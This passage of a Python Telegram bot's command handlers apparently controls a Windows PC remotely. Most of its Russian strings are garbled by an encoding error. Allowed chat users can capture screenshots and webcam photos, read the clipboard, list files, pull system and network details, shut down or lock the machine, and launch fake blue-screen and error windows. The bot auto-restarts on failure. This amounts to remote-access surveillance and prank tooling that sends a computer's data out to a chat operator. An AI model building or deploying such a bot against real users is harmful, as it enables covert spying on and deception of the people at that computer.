        bot.send_message(message.chat.id, "üîí –ö–æ–º–ø—å—é—Ç–µ—Ä –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω!")
    else:
        bot.send_message(message.chat.id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å")


@bot.message_handler(commands=['info'])
def info_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    info = get_system_info()
    bot.send_message(message.chat.id, f"üìä –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ:\n\n{info}")


@bot.message_handler(commands=['weather'])
def weather_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    city = message.text[9:] if len(message.text) > 9 else "–ú–æ—Å–∫–≤–∞"
    weather = get_weather(city)
    bot.send_message(message.chat.id, weather)


@bot.message_handler(commands=['network'])
def network_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    info = get_network_info()
    bot.send_message(message.chat.id, f"üåê –°–µ—Ç–µ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:\n\n{info}")


@bot.message_handler(commands=['joke'])
def joke_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    joke = tell_joke()
    bot.send_message(message.chat.id, f"üé≠ {joke}")


@bot.message_handler(commands=['fact'])
def fact_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    fact = random_fact()
    bot.send_message(message.chat.id, f"ü§î {fact}")


@bot.message_handler(commands=['8ball'])
def eight_ball_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    answer = magic_8ball()
    bot.send_message(message.chat.id, f"üîÆ –ú–∞–≥–∏—á–µ—Å–∫–∏–π —à–∞—Ä –≥–æ–≤–æ—Ä–∏—Ç: {answer}")


@bot.message_handler(commands=['files'])
def files_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    files = list_files()
    bot.send_message(message.chat.id, f"üìÅ –§–∞–π–ª—ã –≤ —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏:\n\n{files}")


@bot.message_handler(commands=['clipboard'])
def clipboard_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    content = get_clipboard()
    bot.send_message(message.chat.id, f"üìã –ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞:\n{content}")


@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
ü§ñ –ü–û–ú–û–©–¨ –ü–û –ë–û–¢–£

üìã –§–ï–ô–ö–û–í–´–ï –≠–ö–†–ê–ù–´:
üíô –°–∏–Ω–∏–π —ç–∫—Ä–∞–Ω - –§–µ–π–∫–æ–≤—ã–π BSOD
‚ö´ –ß—ë—Ä–Ω—ã–π —ç–∫—Ä–∞–Ω - –ü—É—Å—Ç–æ–π —ç–∫—Ä–∞–Ω —Å –∫—É—Ä—Å–æ—Ä–æ–º  
‚ùå –û—à–∏–±–∫–∞ - –û–∫–Ω–æ –æ—à–∏–±–∫–∏ Windows
üìä –ó–∞–≥—Ä—É–∑–∫–∞ - –≠–∫—Ä–∞–Ω –∑–∞–≥—Ä—É–∑–∫–∏ —Å –ø—Ä–æ–≥—Ä–µ—Å—Å–±–∞—Ä–æ–º

üö´ –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –æ–∫–Ω–∞–º–∏:
/close - –ó–∞–∫—Ä—ã—Ç—å –≤—Å–µ –∞–∫—Ç–∏–≤–Ω—ã–µ –æ–∫–Ω–∞
/status - –ü–æ–∫–∞–∑–∞—Ç—å —Å—Ç–∞—Ç—É—Å –æ–∫–æ–Ω

üí° –ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:
1. –ù–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É —Å –Ω—É–∂–Ω—ã–º —ç–∫—Ä–∞–Ω–æ–º
2. –≠–∫—Ä–∞–Ω –æ—Ç–∫—Ä–æ–µ—Ç—Å—è –ø–æ–≤–µ—Ä—Ö –≤—Å–µ—Ö –æ–∫–æ–Ω
3. –ù–∞–∂–º–∏ ESC —á—Ç–æ–±—ã –∑–∞–∫—Ä—ã—Ç—å —ç–∫—Ä–∞–Ω
4. –ò—Å–ø–æ–ª—å–∑—É–π /close —á—Ç–æ–±—ã –∑–∞–∫—Ä—ã—Ç—å –≤—Å–µ

‚ö†Ô∏è –í—Å–µ —ç–∫—Ä–∞–Ω—ã –∑–∞–∫—Ä—ã–≤–∞—é—Ç—Å—è –ø–æ ESC!
"""
    bot.send_message(message.chat.id, help_text)


# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Ç–µ–∫—Å—Ç–æ–≤—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π (–∫–Ω–æ–ø–∫–∏)
@bot.message_handler(content_types=['text'])
def handle_text(message):
    if not is_user_allowed(message.from_user.id):
        return

    text = message.text
    chat_id = message.chat.id

    # –§–µ–π–∫–æ–≤—ã–µ —ç–∫—Ä–∞–Ω—ã
    if text == 'üíô –°–∏–Ω–∏–π —ç–∫—Ä–∞–Ω':
        bot.send_message(chat_id, "üíô –ó–∞–ø—É—Å–∫–∞—é —Ñ–µ–π–∫–æ–≤—ã–π —Å–∏–Ω–∏–π —ç–∫—Ä–∞–Ω...")
        if fake_blue_screen(chat_id):
            bot.send_message(chat_id, "‚úÖ –°–∏–Ω–∏–π —ç–∫—Ä–∞–Ω –∑–∞–ø—É—â–µ–Ω! –ù–∞–∂–º–∏ ESC —á—Ç–æ–±—ã –∑–∞–∫—Ä—ã—Ç—å")
        else:
            bot.send_message(chat_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å —Å–∏–Ω–∏–π —ç–∫—Ä–∞–Ω")

    elif text == '‚ö´ –ß—ë—Ä–Ω—ã–π —ç–∫—Ä–∞–Ω':
        bot.send_message(chat_id, "‚ö´ –ó–∞–ø—É—Å–∫–∞—é —Ñ–µ–π–∫–æ–≤—ã–π —á–µ—Ä–Ω—ã–π —ç–∫—Ä–∞–Ω...")
        if fake_black_screen(chat_id):
            bot.send_message(chat_id, "‚úÖ –ß–µ—Ä–Ω—ã–π —ç–∫—Ä–∞–Ω –∑–∞–ø—É—â–µ–Ω! –ù–∞–∂–º–∏ ESC —á—Ç–æ–±—ã –∑–∞–∫—Ä—ã—Ç—å")
        else:
            bot.send_message(chat_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å —á–µ—Ä–Ω—ã–π —ç–∫—Ä–∞–Ω")

    elif text == '‚ùå –û—à–∏–±–∫–∞':
        bot.send_message(chat_id, "‚ùå –ó–∞–ø—É—Å–∫–∞—é —Ñ–µ–π–∫–æ–≤—É—é –æ—à–∏–±–∫—É...")
        if fake_error_message(chat_id):
            bot.send_message(chat_id, "‚úÖ –û—à–∏–±–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞! –ù–∞–∂–º–∏ ESC —á—Ç–æ–±—ã –∑–∞–∫—Ä—ã—Ç—å")
        else:
            bot.send_message(chat_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å –æ—à–∏–±–∫—É")

    elif text == 'üìä –ó–∞–≥—Ä—É–∑–∫–∞':
        bot.send_message(chat_id, "üìä –ó–∞–ø—É—Å–∫–∞—é —Ñ–µ–π–∫–æ–≤—É—é –∑–∞–≥—Ä—É–∑–∫—É...")
        if fake_loading_screen(chat_id):
            bot.send_message(chat_id, "‚úÖ –ó–∞–≥—Ä—É–∑–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞! –ù–∞–∂–º–∏ ESC —á—Ç–æ–±—ã –∑–∞–∫—Ä—ã—Ç—å")
        else:
            bot.send_message(chat_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å –∑–∞–≥—Ä—É–∑–∫—É")

    elif text == 'üö´ –ó–∞–∫—Ä—ã—Ç—å –æ–∫–Ω–∞':
        close_windows_command(message)

    elif text == 'üìä –°—Ç–∞—Ç—É—Å –æ–∫–æ–Ω':
        status_command(message)

    # –û—Å—Ç–∞–ª—å–Ω—ã–µ –∫–Ω–æ–ø–∫–∏...
    elif text == 'üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç':
        bot.send_message(chat_id, "üì∏ –î–µ–ª–∞—é —Å–∫—Ä–∏–Ω—à–æ—Ç...")
        send_screenshot(chat_id)

    elif text == 'üì∑ –í–µ–±–∫–∞–º–µ—Ä–∞':
        bot.send_message(chat_id, "üì∑ –í–∫–ª—é—á–∞—é –≤–µ–±–∫–∞–º–µ—Ä—É...")
        send_webcam_photo(chat_id)

    elif text == 'üìã –ò–Ω—Ñ–æ':
        info = get_system_info()
        bot.send_message(chat_id, f"üìä –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ:\n\n{info}")

    elif text == 'üîå –í—ã–∫–ª—é—á–∏—Ç—å':
        if shutdown_pc():
            bot.send_message(chat_id, "üîå –ö–æ–º–ø—å—é—Ç–µ—Ä –≤—ã–∫–ª—é—á–∞–µ—Ç—Å—è...")
        else:
            bot.send_message(chat_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä")

    elif text == 'üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞':
        if restart_pc():
            bot.send_message(chat_id, "üîÑ –ö–æ–º–ø—å—é—Ç–µ—Ä –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è...")
        else:
            bot.send_message(chat_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä")

    elif text == 'üîí –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å':
        if lock_pc():
            bot.send_message(chat_id, "üîí –ö–æ–º–ø—å—é—Ç–µ—Ä –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω!")
        else:
            bot.send_message(chat_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å")

    # –ú–µ–¥–∏–∞ —Ñ—É–Ω–∫—Ü–∏–∏
    elif text == 'üéµ –ì—Ä–æ–º–∫–æ—Å—Ç—å +':
        if volume_up():
            bot.send_message(chat_id, "üîä –ì—Ä–æ–º–∫–æ—Å—Ç—å —É–≤–µ–ª–∏—á–µ–Ω–∞")
        else:
            bot.send_message(chat_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑–º–µ–Ω–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å")

    elif text == 'üéµ –ì—Ä–æ–º–∫–æ—Å—Ç—å -':
        if volume_down():
            bot.send_message(chat_id, "üîâ –ì—Ä–æ–º–∫–æ—Å—Ç—å —É–º–µ–Ω—å—à–µ–Ω–∞")
        else:
            bot.send_message(chat_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑–º–µ–Ω–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å")

    elif text == 'üîá Mute':
        if mute_volume():
            bot.send_message(chat_id, "üîá –ó–≤—É–∫ –≤—ã–∫–ª—é—á–µ–Ω")
        else:
            bot.send_message(chat_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫")

    # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
    elif text == 'üìÅ –§–∞–π–ª—ã':
        files = list_files()
        bot.send_message(chat_id, f"üìÅ –§–∞–π–ª—ã –≤ —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏:\n\n{files}")

    elif text == 'üå§ –ü–æ–≥–æ–¥–∞':
        weather = get_weather()
        bot.send_message(chat_id, weather)

    elif text == 'üåê –°–µ—Ç—å':
        info = get_network_info()
        bot.send_message(chat_id, f"üåê –°–µ—Ç–µ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:\n\n{info}")

    # –†–∞–∑–≤–ª–µ—á–µ–Ω–∏—è
    elif text == 'üéÆ –ò–≥—Ä—ã':
        bot.send_message(chat_id, "üéÆ –ò—Å–ø–æ–ª—å–∑—É–π –∫–æ–º–∞–Ω–¥—ã: /joke /fact /8ball")

    elif text == 'üîÆ 8ball':
        answer = magic_8ball()
        bot.send_message(chat_id, f"üîÆ –ú–∞–≥–∏—á–µ—Å–∫–∏–π —à–∞—Ä –≥–æ–≤–æ—Ä–∏—Ç: {answer}")

    elif text == 'üé≠ –®—É—Ç–∫–∞':
        joke = tell_joke()
        bot.send_message(chat_id, f"üé≠ {joke}")

    elif text == 'ü§î –§–∞–∫—Ç':
        fact = random_fact()
        bot.send_message(chat_id, f"ü§î {fact}")

    # –£—Ç–∏–ª–∏—Ç—ã
    elif text == 'üìã –ë—É—Ñ–µ—Ä':
        content = get_clipboard()
        bot.send_message(chat_id, f"üìã –ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞:\n{content}")

    elif text == '‚ùì –ü–æ–º–æ—â—å':
        help_command(message)

    else:
        bot.send_message(chat_id, "‚ùå –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞. –ò—Å–ø–æ–ª—å–∑—É–π –∫–Ω–æ–ø–∫–∏ –∏–ª–∏ /help")


if __name__ == "__main__":
    print("ü§ñ –ë–æ—Ç –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è...")
    print(f"üëë –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä: {YOUR_USERNAME}")

    if not os.path.exists(ALLOWED_USERS_FILE):
        save_allowed_users([YOUR_ADMIN_ID])
        print("‚úÖ –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –¥–æ–±–∞–≤–ª–µ–Ω –≤ —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã–µ")

    print("üíô –§–µ–π–∫–æ–≤—ã–µ —ç–∫—Ä–∞–Ω—ã –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω—ã")
    print("üü¢ –ë–û–¢ –ó–ê–ü–£–©–ï–ù –ò –ì–û–¢–û–í –ö –†–ê–ë–û–¢–ï! üöÄ")

    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –±–æ—Ç–∞: {e}")
        print("üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞—é –±–æ—Ç–∞...")
        time.sleep(5)
        os.execv(sys.executable, ['python'] + sys.argv)